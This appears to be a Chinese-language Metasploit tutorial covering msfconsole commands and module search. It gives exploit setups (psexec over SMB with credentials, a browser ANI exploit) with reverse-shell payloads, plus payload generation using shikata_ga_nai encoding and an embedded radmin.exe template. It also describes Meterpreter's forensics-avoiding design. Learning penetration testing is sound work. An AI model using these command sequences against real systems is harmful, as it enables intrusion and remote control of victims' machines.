    基本使用¶

    0x01 检查升级¶

    apt update; apt install metasploit-framework

    0x02 msfconsole使用接口¶

    msfconsole, 最流行的用户接口,几乎可以使用全部MSF功能,控制台命令支持, 支持 TAB 自动补齐, 支持外部命令的执行(系统命令等)

    启动:¶

    点击鼠标启动 / msfconsole -h -q -r -v

    退出: exit¶

    帮助: help / ？ / help vulns¶

    常用控制台命令¶

    • banner,color、connect -h
    • show auxiliary / exploits / payloads / encoders / nops
    • search usermap_script / help search
     search -h
Usage: search [keywords]

Keywords:
  app       :  Modules that are client or server attacks
  author    :  Modules written by this author
  bid       :  Modules with a matching Bugtraq ID
  cve       :  Modules with a matching CVE ID
  edb       :  Modules with a matching Exploit-DB ID
  name      :  Modules with a matching descriptive name
  platform  :  Modules affecting this platform
  ref       :  Modules with a matching ref
  type      :  Modules of a specific type (exploit, auxiliary, or post)

Examples:
  search cve:2009 type:exploit app:client
    • use dos/windows/smb/ms09_001_write
    • show options / payloads / targets / advanced / evasion
    • info edit
    • check 、back

    Exploit 模块¶

    主动模块¶

    • use exploit/windows/smb/psexec
    • set RHOST 192.168.1.100
    • set PAYLOAD windows/shell/reverse_tcp - set LHOST 192.168.1.1
    • set LPORT 4444
    • set SMBUSER user1
    • set SMBPASS pass1
    • exploit

    被动模块¶

    • use exploit/windows/browser/ms07_017_ani_loadimage_chunksize
    • set URIPATH /
    • set PAYLOAD windows/shell/reverse_tcp
    • set LHOST 192.168.1.1
    • set LPORT 4444
    • exploit

    生成payload¶

    • use payload/windows/shell_bind_tcp
    • generate (msf自动选择编码模块绕过坏字符)
    • generate -b '\x00' # 手动选择去坏字符
    • generate -b '\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b'
    • 手动指定编码模块
    • show encoders / generate -e x86/nonalpha
    generate -b '\x00' -t exe -e x86/shikata_ga_nai -i 5 -k -x /usr/ share/windows-binaries/radmin.exe -f /root/1.exe

    NOP¶

    为no-operation 或 Next Operation(表示无任何操作), EIP返回到存储NOP sled的任意地址时将递增,最终导致shellcode执行, - generate -s 14

    Meterpreter¶

    payload 中的一种, 不过比其他的payload强大.是高级、动态、可扩展的Payload, 可以基于上下文利用更多的漏洞发动攻击. 后渗透测试阶段一站式操作界面.

    • 完全基千内存的DLL注入式 payload(不写硬盘)
    • 注入合法系统进程并建立stager
    • 基千Stager上传和预加载DLL进行扩展模块的注入(客户端API)
    • 基千stager建立的socket连接建立加密的TLS/1.0通信隧道
    • 利用TLS隧道进—步加载后续扩展模块(避免网络取证)
    • 服务端使用C语言编写
    • 客户端提供基于ruby的全特性API(支持任何语言)

    • python_import -f find.py
